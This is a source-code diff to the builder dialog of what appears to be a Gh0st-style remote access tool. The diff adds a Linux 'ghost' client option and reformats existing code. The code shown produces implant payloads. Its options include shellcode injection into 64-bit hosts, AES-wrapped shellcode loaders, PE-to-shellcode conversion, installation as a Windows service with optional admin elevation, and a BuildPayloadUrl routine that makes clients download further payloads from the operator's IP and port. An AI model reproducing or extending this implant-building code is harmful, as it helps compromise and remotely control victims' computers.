@@ -24,6 +24,7 @@ enum Index {
     IndexTinyRun,
     IndexGhostMsc,
     IndexTestRunMsc,
+    IndexLinuxGhost,
     OTHER_ITEM
 };
 
@@ -145,7 +146,7 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
     DDX_Control(pDX, IDC_STATIC_DOWNLOAD, m_StaticDownload);
     DDX_Control(pDX, IDC_EDIT_DOWNLOAD_URL, m_EditDownloadUrl);
     DDX_Text(pDX, IDC_EDIT_DOWNLOAD_URL, m_sDownloadUrl);
-	DDV_MaxChars(pDX, m_sDownloadUrl, 255);
+    DDV_MaxChars(pDX, m_sDownloadUrl, 255);
 }
 
 
@@ -289,7 +290,8 @@ bool IsValidFileName(const CString& strName)
     return true;
 }
 
-CString BuildPayloadUrl(const char* ip, const char* name) {
+CString BuildPayloadUrl(const char* ip, const char* name)
+{
     int port = THIS_CFG.GetInt("settings", "FileSvrPort", 80);
     CString url = CString("http://") + CString(ip) + ":" + std::to_string(port).c_str() + CString("/payloads/") + name;
     return url;
@@ -308,6 +310,10 @@ void CBuildDlg::OnBnClickedOk()
     if (index == IndexTestRun_InjSC && !is64bit) {
         MessageBoxL("Shellcode 只能向64位电脑注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
         return;
+    }
+    if (index == IndexLinuxGhost) {
+        m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
+        m_SliderClientSize.SetPos(0);
     }
     int startup = Startup_DLL;
     CString file;
@@ -353,6 +359,11 @@ void CBuildDlg::OnBnClickedOk()
         file = "TinyRun.dll";
         typ = CLIENT_TYPE_SHELLCODE;
         szBuffer = ReadResource(is64bit ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, dwFileSize);
+        break;
+    case IndexLinuxGhost:
+        file = "ghost";
+        typ = CLIENT_TYPE_LINUX;
+        szBuffer = ReadResource(IDR_LINUX_GHOST, dwFileSize);
         break;
     case OTHER_ITEM: {
         m_OtherItem.GetWindowTextA(file);
@@ -494,12 +505,12 @@ void CBuildDlg::OnBnClickedOk()
                                 strcpy(sc->file, PathFindFileNameA(payload));
                                 strcpy(sc->targetDir, targetDir);
                                 BOOL checked = m_BtnFileServer.GetCheck() == BST_CHECKED;
-                                if (checked){
+                                if (checked) {
                                     strcpy(sc->downloadUrl, m_sDownloadUrl.IsEmpty() ? BuildPayloadUrl(m_strIP, sc->file) : m_sDownloadUrl);
                                     if (m_sDownloadUrl.IsEmpty()) MessageBoxL(CString("文件下载地址: \r\n") + sc->downloadUrl, "提示", MB_ICONINFORMATION);
                                 }
-                                tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : 
-                                    checked ? "\r\n提示: 本机提供下载时，载荷文件必须拷贝至\"Payloads\"目录。" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
+                                tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" :
+                                      checked ? "\r\n提示: 本机提供下载时，载荷文件必须拷贝至\"Payloads\"目录。" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
                             }
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
                             if (r) {
@@ -517,7 +528,7 @@ void CBuildDlg::OnBnClickedOk()
                 int pe_2_shellcode(const std::string & in_path, const std::string & out_str);
                 int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
                 if (ret)MessageBoxL(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()),
-                                       "提示", MB_ICONINFORMATION);
+                                        "提示", MB_ICONINFORMATION);
             } else if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES_OLD) { // 兼容旧版本
                 DWORD dwSize = 0;
                 LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64_OLD : IDR_SCLOADER_X86_OLD, dwSize);
@@ -594,6 +605,7 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboExe.InsertStringL(IndexTinyRun, "TinyRun.dll");
     m_ComboExe.InsertStringL(IndexGhostMsc, "ghost.exe - Windows 服务");
     m_ComboExe.InsertStringL(IndexTestRunMsc, "TestRun - Windows 服务");
+    m_ComboExe.InsertStringL(IndexLinuxGhost, "ghost - Linux x64");
     m_ComboExe.InsertStringL(OTHER_ITEM, CString("选择文件"));
     m_ComboExe.SetCurSel(IndexTestRun_MemDLL);
 
@@ -746,11 +758,11 @@ void CBuildDlg::OnClientRunasAdmin()
     m_runasAdmin = !m_runasAdmin;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
     SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, m_runasAdmin ? MF_CHECKED : MF_UNCHECKED);
-	static bool warned = false;
+    static bool warned = false;
     if (m_runasAdmin && !warned) {
         warned = true;
         MessageBoxL("安装Windows服务必须设置，客户端运行时会请求管理员权限，可能会触发系统UAC提示。\n"
-            "如果未设置，则程序会以当前用户的权限运行，通常也能安装成功。", "提示", MB_ICONINFORMATION);
+                    "如果未设置，则程序会以当前用户的权限运行，通常也能安装成功。", "提示", MB_ICONINFORMATION);
     }
 }
 
@@ -765,13 +777,13 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
     m_BtnFileServer.SetCheck(BST_UNCHECKED);
     m_StaticDownload.ShowWindow(SW_HIDE);
     m_EditDownloadUrl.ShowWindow(SW_HIDE);
-	static bool warned = false;
+    static bool warned = false;
     if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && !warned) {
-		warned = true;
+        warned = true;
         MessageBoxL(_T("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些服务器系统运行! "
-            "请自行验证。或者选择其他载荷，或者切换为 ShellCode AES Old 模式生成!"), 
-            "提示", MB_ICONWARNING);
-	}
+                       "请自行验证。或者选择其他载荷，或者切换为 ShellCode AES Old 模式生成!"),
+                       "提示", MB_ICONWARNING);
+    }
 }
 
 BOOL CBuildDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
@@ -913,8 +925,8 @@ void CBuildDlg::OnBnClickedCheckFileserver()
     if (!warned && checked) {
         warned = true;
         MessageBoxL("请提供载荷的下载地址。下载地址前缀为 http 或 https。"
-            "默认由本机提供载荷下载服务，请将载荷文件放在\"Payloads\"目录。"
-            "由本机提供下载时，下载地址可以省略输入。", "提示", MB_ICONINFORMATION);
+                    "默认由本机提供载荷下载服务，请将载荷文件放在\"Payloads\"目录。"
+                    "由本机提供下载时，下载地址可以省略输入。", "提示", MB_ICONINFORMATION);
     }
 }
 
